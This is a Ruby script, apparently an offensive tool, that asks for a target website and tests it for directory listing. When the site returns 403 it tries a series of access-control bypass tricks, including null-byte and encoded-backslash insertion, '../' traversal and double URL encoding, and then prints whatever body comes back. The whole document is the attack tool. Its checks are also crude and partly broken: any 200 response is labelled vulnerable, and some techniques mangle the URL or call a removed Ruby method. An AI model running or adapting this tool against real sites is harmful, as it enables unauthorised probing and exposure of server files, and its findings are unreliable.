require 'net/http'
require 'uri'
require 'colorize'

def check_directory_listing_vulnerability(url)
  uri = URI.parse(url)
  response = Net::HTTP.get_response(uri)

  case response.code.to_i
  when 200
    puts "[*] Checking for Directory Listing vulnerability on #{url}...".green
    puts "[+] Target is vulnerable to Directory Listing.".red
    puts "[+] Exploit: #{uri}".red
    display_directory_contents(uri)
  when 403
    puts "[*] Checking for Directory Listing vulnerability on #{url}...".green
    puts "[+] Directory Listing is forbidden, attempting to bypass...".yellow
    bypass_directory_listing_protection(url)
  else
    puts "[-] Unable to determine vulnerability status. HTTP status code: #{response.code}".red
  end
end

def bypass_directory_listing_protection(url)
  bypassed = false

  # Techniques to attempt to bypass directory listing protection
  techniques = [
    { name: "Adding trailing slash", method: ->(url) { "#{url}/" } },
    { name: "Appending index file names", method: ->(url) { "#{url}/index.html" } },
    { name: "Using %20 to bypass filters", method: ->(url) { "#{url}%20" } },
    { name: "Using uppercase file extensions", method: ->(url) { "#{url.upcase}" } },
    { name: "Using double URL encoding", method: ->(url) { "#{URI.encode(URI.encode(url))}" } },
    { name: "Using encoded null byte (%00)", method: ->(url) { "#{url.gsub("/", "/%00")}" } },
    { name: "Using encoded backslash (%5C)", method: ->(url) { "#{url.gsub("/", "/%5C")}" } },
    { name: "Using directory traversal (../)", method: ->(url) { "#{url}/../" } },
    { name: "Using encoded character encoding (%25, %2E)", method: ->(url) { "#{url.gsub("/", "/%25")}" } },
    # Add more bypass techniques here
  ]

  techniques.each do |technique|
    bypassed_uri = URI.parse(technique[:method].call(url))
    response = Net::HTTP.get_response(bypassed_uri)

    if response.code.to_i == 200
      puts "[+] Directory Listing protection bypassed using #{technique[:name]}.".red
      puts "[+] Exploit: #{bypassed_uri}".red
      display_directory_contents(bypassed_uri)
      bypassed = true
      break
    end
  end

  puts "[-] Bypass attempt failed.".red unless bypassed
end

def display_directory_contents(uri)
  response = Net::HTTP.get_response(uri)
  puts "Directory contents:".green
  puts response.body
end

def main
  puts "Enter your target website URL: "
  target_url = gets.chomp

  begin
    check_directory_listing_vulnerability(target_url)
  rescue StandardError => e
    puts "[-] An error occurred: #{e.message}".red
  end
end

main
